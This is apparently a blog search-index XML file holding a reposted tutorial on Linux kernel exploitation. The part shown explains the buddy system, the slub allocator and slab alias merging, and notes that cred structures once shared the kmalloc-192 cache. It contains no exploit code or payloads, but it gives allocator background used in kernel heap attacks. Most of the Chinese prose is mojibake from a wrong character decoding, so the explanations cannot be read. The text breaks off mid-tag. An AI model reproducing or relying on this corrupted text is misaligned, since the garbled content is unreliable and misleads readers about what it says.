<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux Kernel Pwn in all</title>
    <link href="/2023-02/pwn-new-pwn-kernel-basic/"/>
    <url>/2023-02/pwn-new-pwn-kernel-basic/</url>
    
    <content type="html"><![CDATA[<p><strong>å…¨æ–‡è½¬è½½è‡ª<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/">è¿™é‡Œ</a>(å†™çš„å¤ªå¥½å¿ä¸ä½ç›´æ¥cv), ç¨ä½œäº†ä¸€ç‚¹ä¿®æ”¹, åŠ ä¸Šäº†ä¸€äº›å…¶ä»–çŸ¥è¯†ç‚¹, å› ä¸ºè‡ªå·±å­¦çš„æ—¶å€™è®°å¾—å¤ªé›¶æ•£, å¤§éƒ¨åˆ†å·²ç»ç†è§£å†å…¨éƒ¨é‡å¤´æ•´ç†ä¹Ÿæ²¡å¿…è¦. éµå¾ª<a href="https://creativecommons.org/licenses/by/4.0/">åè®®</a>(è£…æ¨¡ä½œæ ·çš„åŠ ä¸Š)</strong> </p><ul><li>?<p hidden>ç›´æ¥å¤åˆ¶ç½‘é¡µä¼šæœ‰ç‚¹é—®é¢˜â€¦ç”¨äº†æ­£åˆ™æ›¿æ¢, åˆå­¦äº†ç‚¹ä¸œè¥¿ æ­¤é¡µå›¾ç‰‡å·²ä¸Šä¼ . </p><p hidden><img src="https://s2.loli.net/2023/02/06/ojF59Lk3ShBJdvC.png" alt="image-20230206145939119"></p> </li></ul><h1 id="kernel-mechanism"><a href="#kernel-mechanism" class="headerlink" title="kernel mechanism"></a>kernel mechanism</h1><h2 id="å†…æ ¸å†…å­˜ç»“æ„-amp-ç®¡ç†"><a href="#å†…æ ¸å†…å­˜ç»“æ„-amp-ç®¡ç†" class="headerlink" title="å†…æ ¸å†…å­˜ç»“æ„ &amp; ç®¡ç†"></a>å†…æ ¸å†…å­˜ç»“æ„ &amp; ç®¡ç†</h2><h3 id="ä¸€ã€-é¡µâ†’åŒºâ†’èŠ‚ç‚¹ä¸‰çº§ç»“æ„"><a href="#ä¸€ã€-é¡µâ†’åŒºâ†’èŠ‚ç‚¹ä¸‰çº§ç»“æ„" class="headerlink" title="ä¸€ã€ é¡µâ†’åŒºâ†’èŠ‚ç‚¹ä¸‰çº§ç»“æ„"></a>ä¸€ã€ é¡µâ†’åŒºâ†’èŠ‚ç‚¹ä¸‰çº§ç»“æ„</h3><p>è¿™æ˜¯ä¸€å¼ ååˆ†ç»å…¸çš„ _Overview_ï¼Œè‡ªé¡¶å‘ä¸‹æ˜¯</p><ul><li><strong>èŠ‚ç‚¹</strong>ï¼ˆnodeï¼Œå¯¹åº”ç»“æ„ä½“ pgdata_listï¼‰</li><li><strong>åŒº</strong>ï¼ˆzoneï¼Œå¯¹åº”ç»“æ„ä½“ zoneï¼Œå›¾ä¸Šå±•ç¤ºäº†ä¸‰ç§ç±»å‹çš„ zoneï¼‰</li><li><strong>é¡µ</strong>ï¼ˆpageï¼Œå¯¹åº”ç»“æ„ä½“ pageï¼‰</li></ul><img src="https://s2.loli.net/2023/02/06/HDQELjdIpNCT3o8.png" alt="image-20230206222651655" style="zoom:67%;" /><p>çœ‹å†…å­˜ç®¡ç†åˆ†æçš„æ—¶å€™çš„ä¸€ç‚¹é¢å¤–ç¬”è®°:</p><ul><li><p>pageç»“æ„ä½“ç›¸å½“çš„é•¿, çœ‹åˆ°compound pageçš„æ—¶å€™æŸ¥äº†ç‚¹ä¸œè¥¿, <a href="https://lwn.net/Articles/565097/">è¿™ä¸€ç¯‡</a>13å¹´çš„æ–‡ç« è®²äº†pageé‡Œé¢ä¸ºä»€ä¹ˆæœ‰è¿™ä¹ˆå¤šä¸œè¥¿+æ€ä¹ˆå¡è¿›å»çš„+ä»¥åŠæ˜¯äº›å•¥. è¿™å’Œæˆ‘åœ¨oså®éªŒé‡Œ(æ¸…åçš„)çœ‹åˆ°çš„pageå¤æ‚å¤šäº†, é‚£ä¸ªå°±å‡ ä¸ªæˆå‘˜å˜é‡, è€Œä¸”å†…æ ¸é€šè¿‡é“¾è¡¨ç®¡ç†å†…å­˜ç©ºé—´, éå¸¸ç®€åŒ–çš„å®ç°, ç°åœ¨linuxä¸­ä½¿ç”¨çš„SL*Bç®¡ç†+åŒ¿åé¡µ+<a href="https://lwn.net/Articles/619514/">compound</a>é¡µä¹‹ç±»çš„æœºåˆ¶å¯¼è‡´pageç»“æ„ä½“é‡Œæœ‰éå¸¸å¤šçš„ä¿¡æ¯. </p></li><li><blockquote><p><strong>Non-uniform memory access</strong> (<strong>NUMA</strong>), </p></blockquote></li></ul><h3 id="äºŒã€å†…å­˜æ¨¡å‹"><a href="#äºŒã€å†…å­˜æ¨¡å‹" class="headerlink" title="äºŒã€å†…å­˜æ¨¡å‹"></a>äºŒã€å†…å­˜æ¨¡å‹</h3><p>Linux æä¾›äº†ä¸‰ç§å†…å­˜æ¨¡å‹ï¼Œå®šä¹‰äº <code>include/asm-generic/memory_model.h</code> ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå·çš„å›¾ï¼Œä¾µåˆ ï¼‰ï¼š</p><p><a href="https://i.loli.net/2021/11/25/wLzFuCB5n1DAIY7.png"><img src="https://s2.loli.net/2023/02/06/yAJzZEVLKUvX4li.png" alt="image.png"></a></p><p>å†…å­˜æ¨¡å‹åœ¨ç¼–è¯‘æœŸå°±ä¼šè¢«ç¡®å®šä¸‹æ¥ï¼Œç›®å‰å¸¸ç”¨çš„æ˜¯ <code>Sparse Memory</code> æ¨¡å‹ï¼Œå³ç¦»æ•£å†…å­˜æ¨¡å‹</p><h3 id="ä¸‰ã€buddy-system"><a href="#ä¸‰ã€buddy-system" class="headerlink" title="ä¸‰ã€buddy system"></a>ä¸‰ã€buddy system</h3><blockquote><p>ç›®å‰çš„ CTF é¢˜ç›®å½“ä¸­è¿˜æ²¡æœ‰å‡ºç°é’ˆå¯¹ buddy system è¿›è¡Œåˆ©ç”¨çš„é¢˜ç›®ï¼Œä½†æ˜¯<a href="https://etenal.me/archives/1825">æœ‰å®‰å…¨ç ”ç©¶å‘˜åœ¨ CVE-2022-27666 ä¸­è¿ç”¨äº†é¡µçº§å †é£æ°´çš„æŠ€å·§</a>ï¼Œç¬”è€…è®¤ä¸ºéå¸¸ nb</p></blockquote><p>buddy system æ˜¯ Linux kernel ä¸­çš„ä¸€ä¸ªè¾ƒä¸ºåº•å±‚çš„å†…å­˜ç®¡ç†ç³»ç»Ÿï¼Œ<strong>ä»¥å†…å­˜é¡µä¸ºç²’åº¦ç®¡ç†è€…æ‰€æœ‰çš„ç‰©ç†å†…å­˜</strong>ï¼Œå…¶å­˜åœ¨äº <strong>åŒº</strong> è¿™ä¸€çº§åˆ«ï¼Œå¯¹å½“å‰åŒºæ‰€å¯¹åº”æ‹¥æœ‰çš„æ‰€æœ‰ç‰©ç†é¡µæ¡†è¿›è¡Œç®¡ç†</p><p>åœ¨æ¯ä¸ª zone ç»“æ„ä½“ä¸­éƒ½æœ‰ä¸€ä¸ª free_area ç»“æ„ä½“æ•°ç»„ï¼Œç”¨ä»¥å­˜å‚¨ buddy system <strong>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span>    <span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­çš„ <code>MAX_ORDER</code> ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸º 11</p><p>åœ¨ buddy system ä¸­æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸º<strong>è¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°</strong>ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯<code>é˜¶</code>ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š2^order^ </p><p>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°è¿™æ ·ä¸€å¼ _Overview_ï¼š</p><p><a href="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png"><img src="https://s2.loli.net/2023/02/06/3vyhlAsYpLqPkdb.png" alt="è‡ªå·±ç”»çš„å›¾.png" style="zoom: 80%;" /></a></p><ul><li>åˆ†é…ï¼š<ul><li>é¦–å…ˆä¼šå°†è¯·æ±‚çš„å†…å­˜å¤§å°å‘ 2 çš„å¹‚æ¬¡æ–¹å¼ å†…å­˜é¡µå¤§å°å¯¹é½ï¼Œä¹‹åä»å¯¹åº”çš„ä¸‹æ ‡å–å‡ºè¿ç»­å†…å­˜é¡µ</li><li>è‹¥å¯¹åº”ä¸‹æ ‡é“¾è¡¨ä¸ºç©ºï¼Œåˆ™ä¼šä»ä¸‹ä¸€ä¸ª order ä¸­å–å‡ºå†…å­˜é¡µï¼Œä¸€åˆ†ä¸ºäºŒï¼Œè£…è½½åˆ°å½“å‰ä¸‹æ ‡å¯¹åº”é“¾è¡¨ä¸­ï¼Œä¹‹åå†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨ï¼Œè‹¥ä¸‹ä¸€ä¸ª order ä¹Ÿä¸ºç©ºåˆ™ä¼šç»§ç»­å‘æ›´é«˜çš„ order è¿›è¡Œè¯¥è¯·æ±‚è¿‡ç¨‹</li></ul></li><li>é‡Šæ”¾ï¼š<ul><li>å°†å¯¹åº”çš„è¿ç»­å†…å­˜é¡µé‡Šæ”¾åˆ°å¯¹åº”çš„é“¾è¡¨ä¸Š</li><li>æ£€ç´¢æ˜¯å¦æœ‰å¯ä»¥åˆå¹¶çš„å†…å­˜é¡µï¼Œè‹¥æœ‰ï¼Œåˆ™è¿›è¡Œåˆæˆï¼Œæ”¾å…¥æ›´é«˜ order çš„é“¾è¡¨ä¸­</li></ul></li></ul><p>ä½†æ˜¯æˆ‘ä»¬å¾ˆå®¹æ˜“äº§ç”Ÿä¸å®¹æ˜“åˆå¹¶çš„å†…å­˜ç¢ç‰‡ï¼Œå› æ­¤ Linux kernel è¿˜ä¼šè¿›è¡Œ <em>å†…å­˜è¿ç§»</em> ä»¥å‡å°‘å†…å­˜ç¢ç‰‡ï¼Œä¸»è¦ç”±ä¸€ä¸ªæŒç»­è¿è¡Œçš„å†…æ ¸çº¿ç¨‹å®Œæˆï¼Œç”±äºä¸æ˜¯æœ¬ç¯‡é‡ç‚¹æ•…ä¸åœ¨æ­¤èµ˜å™. </p><p>åœ¨Linuxä¸­ï¼Œä½¿ç”¨buddy systemåˆ†é…çš„åº•å±‚APIä¸»è¦æœ‰ <code>get_free_pages</code> å’Œ <code>alloc_pages</code>ï¼Œä¼ å…¥çš„å‚æ•°éƒ½æ˜¯orderï¼Œè¿˜æœ‰ä¸€äº›flagä½.</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™æ ·åˆ†é…å¾—åˆ°çš„è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€éƒ½æ˜¯è¿ç»­çš„ï¼Œè¿”å›çš„åœ°å€å¯ä»¥ä½¿ç”¨ <code>virts_to_phys</code> æˆ–è€… <code>__pa</code> å®è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œå®é™…æ“ä½œä¹Ÿå°±æ˜¯åŠ ä¸Šäº†ä¸€ä¸ªåç§»è€Œå·²ã€‚</p><p>å¯ä»¥é€šè¿‡ <code>/proc/buddyinfo</code> å’Œ <code>/proc/pagetypeinfo</code> æ¥æŸ¥çœ‹ç›¸å…³çš„æƒ…å†µ.</p><h3 id="å››ã€slab-allocator"><a href="#å››ã€slab-allocator" class="headerlink" title="å››ã€slab allocator  "></a>å››ã€slab allocator <span id="slab"> </span></h3><p><a href="https://hammertux.github.io/slab-allocator">è¿™ç¯‡blog</a>å¥½è¯¦ç»†. </p><p>slab allocator åˆ™æ˜¯æ›´ä¸ºç»†ç²’åº¦çš„å†…å­˜ç®¡ç†å™¨ï¼Œå…¶é€šè¿‡å‘ buddy system è¯·æ±‚å•å¼ æˆ–å¤šå¼ è¿ç»­å†…å­˜é¡µåå†åˆ†å‰²æˆåŒç­‰å¤§å°çš„<strong>å¯¹è±¡</strong>ï¼ˆobjectï¼‰è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…æ¥å®ç°æ›´ä¸ºç»†ç²’åº¦çš„å†…å­˜ç®¡ç†</p><p>slab allocator ä¸€å…±æœ‰ä¸‰ç§ç‰ˆæœ¬ï¼š</p><ul><li>slabï¼ˆæœ€åˆçš„ç‰ˆæœ¬ï¼Œæœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œæ•ˆç‡ä¸é«˜ï¼‰</li><li>slobï¼ˆç”¨äºåµŒå…¥å¼ç­‰åœºæ™¯çš„æä¸ºç®€åŒ–ç‰ˆæœ¬ï¼‰</li><li>slubï¼ˆä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œç°åœ¨çš„é€šç”¨ç‰ˆæœ¬</li></ul><p>å¯¹äºä»¥å¾€çš„ slub åˆ†é…å™¨è€Œè¨€ï¼Œè‹¥æ˜¯æˆ‘ä»¬ kmalloc(8) åˆ™é€šå¸¸ä¼šä» <code>kmalloc-8</code> ä¸­å–å¤§å°ä¸º 8 çš„ objectï¼›ä½†æ˜¯åœ¨ slab æºç ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><blockquote><p>å†…æ ¸æºç ç‰ˆæœ¬5.11ï¼Œinclude/linux/slab.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The largest kmalloc size supported by the SLAB allocators is</span><br><span class="hljs-comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span><br><span class="hljs-comment"> * less than 32 MB.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * WARNING: Its not easy to increase this value since the allocators have</span><br><span class="hljs-comment"> * to do various tricks to work around compiler limitations in order to</span><br><span class="hljs-comment"> * ensure proper constant folding.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span><br><span class="hljs-meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_SHIFT_LOW    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Kmalloc subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> KMALLOC_MIN_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>å³ slab åˆ†é…å™¨åˆ†é…çš„ object çš„å¤§å°<strong>æœ€å°ä¸º 32</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”å½“æ˜¯ä» <code>kmalloc-32</code> ä¸­å– object</p><blockquote><p>é˜…è¯»æºç æˆ‘ä»¬å¯ä»¥å‘ç° slab ä¸º 32ï¼Œ è€Œ slob å’Œ slub éƒ½æ˜¯ 8</p></blockquote><h4 id="I-åŸºæœ¬ç»“æ„"><a href="#I-åŸºæœ¬ç»“æ„" class="headerlink" title="I.åŸºæœ¬ç»“æ„"></a>I.åŸºæœ¬ç»“æ„</h4><p><code>slub</code> ç‰ˆæœ¬çš„ allocator ä¸ºç°åœ¨ç»å¤§å¤šæ•° Linux kernel æ‰€è£…é…çš„ç‰ˆæœ¬ï¼Œå› æ­¤æœ¬ç¯‡æ–‡ç« ä¸»è¦å™è¿°çš„ä¹Ÿæ˜¯ slub allocatorï¼Œå…¶åŸºæœ¬ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><a href="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png"><img src="https://s2.loli.net/2023/02/06/sdFTGcnlvqXjB3o.png" alt="image.png"></a></p><ul><li><p>æˆ‘ä»¬å°† slub allocator æ¯æ¬¡å‘ buddy system è¯·æ±‚å¾—æ¥çš„å•å¼ /å¤šå¼ å†…å­˜é¡µç§°ä¹‹ä¸ºä¸€ä¸ª <code>slub</code>ï¼Œå…¶è¢«åˆ†å‰²ä¸ºå¤šä¸ªåŒç­‰å¤§å°å¯¹è±¡ï¼ˆobjectï¼‰ï¼Œæ¯ä¸ª object ä½œä¸ºä¸€ä¸ªè¢«åˆ†é…å®ä½“ï¼Œ<strong>åœ¨ slub çš„ç¬¬ä¸€å¼ å†…å­˜é¡µå¯¹åº”çš„ page ç»“æ„ä½“ä¸Šçš„ freelist æˆå‘˜æŒ‡å‘è¯¥å¼ å†…å­˜é¡µä¸Šçš„ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡(æ‰€ä»¥å¯ä»¥ç”¨pageæ¥æŒ‡ä»£ä¸€ä¸ªslub)</strong>, ä¸€ä¸ª slub ä¸Šçš„æ‰€æœ‰ç©ºé—²å¯¹è±¡ç»„æˆä¸€ä¸ªä»¥ NULL ç»“å°¾çš„å•å‘é“¾è¡¨</p><blockquote><p>ä¸€ä¸ª object å¯ä»¥ç†è§£ä¸ºç”¨æˆ·æ€ glibc ä¸­çš„ chunkï¼Œ<strong>ä¸è¿‡ object å¹¶ä¸åƒ chunk é‚£æ ·éœ€è¦æœ‰ä¸€ä¸ª headerï¼Œå› ä¸º page ç»“æ„ä½“ä¸ç‰©ç†å†…å­˜é—´å­˜åœ¨çº¿æ€§å¯¹åº”å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ object åœ°å€æ‰¾åˆ°å…¶å¯¹åº”çš„ page ç»“æ„ä½“</strong> </p></blockquote></li><li><p><code>kmem_cache</code> ä¸ºä¸€ä¸ªåŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œå…¶ç”¨äºåˆ†é…æŸä¸ªç‰¹å®šå¤§å°ï¼ˆæŸç§ç‰¹å®šç”¨é€”ï¼‰çš„å¯¹è±¡ï¼Œæ‰€æœ‰çš„ kmem_cache æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¹¶å­˜åœ¨ä¸¤ä¸ªå¯¹åº”çš„ç»“æ„ä½“æ•°ç»„ <code>kmalloc_caches</code> ä¸ <code>kmalloc_dma_caches</code></p></li><li><p>ä¸€ä¸ª <code>kmem_cache</code> ä¸»è¦ç”±ä¸¤ä¸ªæ¨¡å—ç»„æˆï¼š</p><ul><li><code>kmem_cache_cpu</code>ï¼šè¿™æ˜¯ä¸€ä¸ª<strong>percpu å˜é‡</strong>ï¼ˆå³æ¯ä¸ªæ ¸å¿ƒä¸Šéƒ½ç‹¬ç«‹ä¿ç•™æœ‰ä¸€ä¸ªå‰¯æœ¬ï¼ŒåŸç†æ˜¯ä»¥ gs å¯„å­˜å™¨ä½œä¸º percpu æ®µçš„åŸºå€è¿›è¡Œå¯»å€ï¼‰ï¼Œç”¨ä»¥è¡¨ç¤ºå½“å‰æ ¸å¿ƒæ­£åœ¨ä½¿ç”¨çš„ slubï¼Œå› æ­¤å½“å‰ CPU åœ¨ä» kmem_cache_cpu ä¸Šå– object æ—¶<strong>ä¸éœ€è¦åŠ é”</strong>ï¼Œä»è€Œæå¤§åœ°æé«˜äº†æ€§èƒ½</li><li><code>kmem_cache_node</code> : å¯ä»¥ç†è§£ä¸ºå½“å‰ <code>kmem_cache</code> çš„ slub é›†æ•£ä¸­å¿ƒï¼Œå…¶ä¸­å­˜æ”¾ç€ä¸¤ä¸ª slub é“¾è¡¨ï¼š<ul><li>partialï¼šè¯¥ slub ä¸Šå­˜åœ¨ç€ä¸€å®šæ•°é‡çš„ç©ºé—² objectï¼Œä½†å¹¶éå…¨éƒ¨ç©ºé—²</li><li>fullï¼šè¯¥ slub ä¸Šçš„æ‰€æœ‰ object éƒ½è¢«åˆ†é…å‡ºå»äº†</li></ul></li></ul></li></ul><h4 id="II-åˆ†é…-é‡Šæ”¾è¿‡ç¨‹"><a href="#II-åˆ†é…-é‡Šæ”¾è¿‡ç¨‹" class="headerlink" title="II.åˆ†é…/é‡Šæ”¾è¿‡ç¨‹"></a>II.åˆ†é…/é‡Šæ”¾è¿‡ç¨‹</h4><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥æ¥è¯´æ˜ slub allocator çš„åˆ†é…/é‡Šæ”¾è¡Œä¸ºäº†</p><ul><li>åˆ†é…ï¼š<ul><li>é¦–å…ˆä» <code>kmem_cache_cpu</code> ä¸Šå–å¯¹è±¡ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è¿”å›</li><li>è‹¥ <code>kmem_cache_cpu</code> ä¸Šçš„ slub å·²ç»æ— ç©ºé—²å¯¹è±¡äº†ï¼Œå¯¹åº” slub ä¼šè¢«åŠ å…¥åˆ° <code>kmem_cache_node</code> çš„ <strong>full</strong> é“¾è¡¨ï¼Œå¹¶å°è¯•ä» <strong>partial</strong> é“¾è¡¨ä¸Šå–ä¸€ä¸ª slub æŒ‚è½½åˆ° <code>kmem_cache_cpu</code> ä¸Šï¼Œç„¶åå†å–å‡ºç©ºé—²å¯¹è±¡è¿”å›</li><li>è‹¥ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨ä¹Ÿç©ºäº†ï¼Œé‚£å°±<strong>å‘ buddy system è¯·æ±‚åˆ†é…æ–°çš„å†…å­˜é¡µ</strong>ï¼Œåˆ’åˆ†ä¸ºå¤šä¸ª object ä¹‹åå†ç»™åˆ° <code>kmem_cache_cpu</code>ï¼Œå–ç©ºé—²å¯¹è±¡è¿”å›ä¸Šå±‚è°ƒç”¨</li></ul></li><li>é‡Šæ”¾ï¼š<ul><li>è‹¥è¢«é‡Šæ”¾ object å±äº <code>kmem_cache_cpu</code> çš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å½“å‰ CPU slub çš„ freelist</li><li>è‹¥è¢«é‡Šæ”¾ object å±äº <code>kmem_cache_node</code> çš„ partial é“¾è¡¨ä¸Šçš„ slubï¼Œç›´æ¥ä½¿ç”¨å¤´æ’æ³•æ’å…¥å¯¹åº” slub çš„ freelist</li><li>è‹¥è¢«é‡Šæ”¾ object å±äº <code>kmem_cache_node</code> çš„ full é“¾è¡¨ä¸Šçš„ slubï¼Œåˆ™å…¶ä¼šæˆä¸ºå¯¹åº” slub çš„ freelist å¤´èŠ‚ç‚¹ï¼Œ<strong>ä¸”è¯¥ slub ä¼šä» full é“¾è¡¨è¿ç§»åˆ° partial é“¾è¡¨</strong></li></ul></li></ul><p>ä»¥ä¸Šä¾¿æ˜¯ slub allocator çš„åŸºæœ¬åŸç†</p><h4 id="III-slab-alias-mergeability"><a href="#III-slab-alias-mergeability" class="headerlink" title="III. slab alias-mergeability"></a>III. slab alias-mergeability</h4><p>slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰/ç›¸è¿‘å¤§å° object çš„ <code>kmem_cache</code> è¿›è¡Œ<strong>å¤ç”¨</strong>çš„ä¸€ç§æœºåˆ¶ï¼š</p><ul><li>å½“ä¸€ä¸ª <code>kmem_cache</code> åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰/è¿‘ä¼¼å¤§å°çš„ object çš„ <code>kmem_cache</code> ï¼Œåˆ™<strong>ä¸ä¼šåˆ›å»ºæ–°çš„ kmem_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem_cache è¿”å›</strong> </li></ul><p>ä¸¾ä¸ªğŸŒ°ï¼Œ<code>cred_jar</code> æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… <code>cred</code> ç»“æ„ä½“çš„ <code>kmem_cache</code>ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º <code>kmalloc-192</code> çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª <code>kmem_cache</code>â€”â€”<code>kmalloc-192</code> ä¸­åˆ†é…</p><p>å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> è¿™ä¸€ flag çš„ <code>kmem_cache</code> è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ <code>kmem_cache</code> è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ <code>cred_jar</code> ä¸ <code>kmalloc-192</code> ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code>ï¼Œ<strong>å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°</strong> </p><p><strong>å¯¹äºåŒ…å«æœ‰ç”¨æˆ·ç©ºé—´æ•°æ®çš„ç‹¬ç«‹ kmem_cache è€Œè¨€ï¼Œå…¶æ°¸è¿œä¸ä¼šä¸ç°æœ‰çš„ kmem_cache å‘ç”Ÿåˆå¹¶</strong> </p><p>Cache aliasing information is available in <code>/sys/kernel/slab/</code>. For example, the following caches are all merged together:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ls -al /sys/kernel/slab | grep <span class="hljs-string">&#x27;:t-0000128&#x27;</span></span><br>lrwxrwxrwx   1 root root 0 May 16 21:30 aio_kiocb -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 btree_node -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 cifs_mpx_ids -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ecryptfs_key_tfm_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 eventpoll_epi -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 fib6_nodes -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ip6_mrt_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 ip_mrt_cache -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 kmalloc-128 -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 pid -&gt; :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 scsi_sense_cache -&gt; :t-0000128<br>drwxr-xr-x   3 root root 0 May 16 21:30 :t-0000128<br>lrwxrwxrwx   1 root root 0 May 16 21:30 uid_cache -&gt; :t-0000128<br></code></pre></div></td></tr></table></figure><p>There is also a <code>slabinfo</code> tool shipped with the <a 